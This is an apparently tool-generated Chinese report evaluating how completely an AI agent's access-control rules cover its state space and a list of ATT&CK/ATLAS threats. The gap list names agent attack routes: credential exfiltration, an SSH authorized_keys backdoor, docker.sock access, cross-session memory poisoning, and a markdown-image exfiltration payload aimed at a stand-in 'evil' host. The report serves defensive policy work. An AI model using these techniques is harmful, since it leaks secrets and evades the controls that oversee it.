# Agent 访问控制需求完备性评测报告

## 1. 概览

- 规则总数：67
- 自动自检：通过（id 唯一=True，恒假规则=[]）

## 2. 三分区体积（C2）

- 状态空间总数：122880
- V_explicit（显式覆盖，策略表达力）：122880（100.00%）
- **V_danger（默认放行，真实攻击面）：0（0.00%）**
- V_deferred（默认 Challenge，对 LLM 的依赖度）：0（0.00%）

## 3. 一致性与冗余（C3/C4）

- mandatory 重叠（challenge 被 deny 掩盖）状态数：82232
  - 示例：{'operation': 'read', 'resource_class': 'credential', 'target_zone': 'local', 'flags': []}
- 冗余规则：['R001', 'R002', 'R003', 'R004', 'R005', 'R006', 'R007', 'R008', 'R009', 'R010', 'R011', 'R012', 'R020', 'R021', 'R023', 'R026', 'R028', 'R029', 'R034', 'R035', 'R037', 'R038', 'R041', 'R043', 'R044', 'R045', 'R046', 'R047', 'R048', 'R049', 'R050', 'R051', 'R052', 'R053', 'R054', 'R055', 'R056', 'R057', 'R058', 'R059', 'R060', 'R061', 'R063', 'R064', 'R065', 'R066', 'R067']

## 4. 可收紧性（C1 · H1）

- 是否 H1 tight（相对规则级收紧空间）：False
- 可收紧规则：['R043', 'R044', 'R045', 'R046', 'R047', 'R048', 'R049', 'R050', 'R051', 'R052', 'R053', 'R054', 'R055', 'R056', 'R057', 'R058', 'R059', 'R060', 'R061', 'R062', 'R067']

## 5. 敏感度单调性

- 严格偏序倒挂数：9544
- 同级保护不对称数：1792
  - 高={'operation': 'read', 'resource_class': 'agent_memory', 'target_zone': 'local', 'flags': []} D=1 vs 低={'operation': 'read', 'resource_class': 'agent_private_context', 'target_zone': 'local', 'flags': []} D=2
  - 高={'operation': 'read', 'resource_class': 'agent_memory', 'target_zone': 'local', 'flags': ['weakens_control']} D=1 vs 低={'operation': 'read', 'resource_class': 'agent_private_context', 'target_zone': 'local', 'flags': ['weakens_control']} D=2
  - 高={'operation': 'read', 'resource_class': 'agent_memory', 'target_zone': 'local', 'flags': ['persistence']} D=1 vs 低={'operation': 'read', 'resource_class': 'agent_private_context', 'target_zone': 'local', 'flags': ['persistence']} D=2
  - 高={'operation': 'read', 'resource_class': 'agent_memory', 'target_zone': 'local', 'flags': ['privilege_esc']} D=1 vs 低={'operation': 'read', 'resource_class': 'agent_private_context', 'target_zone': 'local', 'flags': ['privilege_esc']} D=2
  - 高={'operation': 'read', 'resource_class': 'agent_memory', 'target_zone': 'local', 'flags': ['supply_chain_exec']} D=1 vs 低={'operation': 'read', 'resource_class': 'agent_private_context', 'target_zone': 'local', 'flags': ['supply_chain_exec']} D=2

## 6. 外部威胁基线对照

- **威胁覆盖率：38.89%（7/18）**
- 需求缺失（补规则可解决）：8
- 词表缺失（需新增观察维度）：3

### 缺口清单

- [需求缺失] TINV-EXFIL-01（T1041/T1048 通道无关机密外传（核心污点不变量））：携带凭据污点外发到外部必须 Deny 反例={'operation': 'send', 'resource_class': 'system_sensitive', 'target_zone': 'external', 'flags': ['taint_credential']}
- [需求缺失] TINV-DESTROY-01（T1485 / AML.T0101 Data Destruction）：破坏性操作必须 Deny 反例={'operation': 'read', 'resource_class': 'agent_memory', 'target_zone': 'local', 'flags': ['destructive']}
- [需求缺失] TINV-PERSIST-01（T1547/T1053 持久化入口）：持久化写入点必须 Deny 反例={'operation': 'read', 'resource_class': 'agent_memory', 'target_zone': 'local', 'flags': ['persistence']}
- [需求缺失] TINV-PRIVESC-01（T1548 提权）：提权操作必须 Deny 反例={'operation': 'read', 'resource_class': 'agent_memory', 'target_zone': 'local', 'flags': ['privilege_esc']}
- [需求缺失] TINV-RECON-01（T1046 网段/端口扫描）：内部侦察扫描必须 Deny 反例={'operation': 'read', 'resource_class': 'agent_memory', 'target_zone': 'local', 'flags': ['recon_scan']}
- [需求缺失] TINV-SUPPLY-01（T1195 供应链隐藏执行）：供应链隐藏执行必须 Deny 反例={'operation': 'read', 'resource_class': 'agent_memory', 'target_zone': 'local', 'flags': ['supply_chain_exec']}
- [需求缺失] TINV-TLS-01（T1562 削弱安全控制）：关闭/绕过安全控制必须 Deny 反例={'operation': 'read', 'resource_class': 'agent_memory', 'target_zone': 'local', 'flags': ['weakens_control']}
- [需求缺失] TINV-CRED-18（T1098.004 SSH authorized_keys 写入（最经典 agent 后门））：写入凭据文件应 Deny（文档凭据类通常只规定读，未规定写） 反例={'operation': 'write', 'resource_class': 'credential', 'target_zone': 'local', 'flags': []}
- [词表缺失] TINV-EXFIL-07（AML.T0077 LLM Response Rendering（![](http://evil/?d=secret)））：模型输出渲染外泄——需新增『模型输出内容』观察维度，非需求缺失
- [词表缺失] TINV-CRED-05（T1552.007 Container API（/var/run/docker.sock））：docker.sock 访问——文档系统敏感清单未含该资源类型
- [词表缺失] TINV-MEM-POISON（跨会话记忆污染）：跨会话记忆污染——需新增『会话边界/写入内容来源』维度

## 7. threats to validity（显式假设）

- A1 不引入 tool 维度——文档所有规则按操作与风险特征表述。
- A2 资源分类器完美（布尔抽象）——路径变形绕过原型阶段不可见。
- A3 MustAllow 推导正确（§5 减 §3、§4）——决定可收紧性结论强度上限。
- A4 H1 只覆盖规则级收紧——H1 tight ≠ 绝对 tight。
- A5 敏感度偏序从章节顺序推导——需人工复核该算子每个输出。
- A6 威胁种子表质量决定覆盖率强度——种子为人工初判，需逐条复核。
- A7 需求集不含管理性语义（委派/角色授予）——否则落入 HRU 不可判定区。
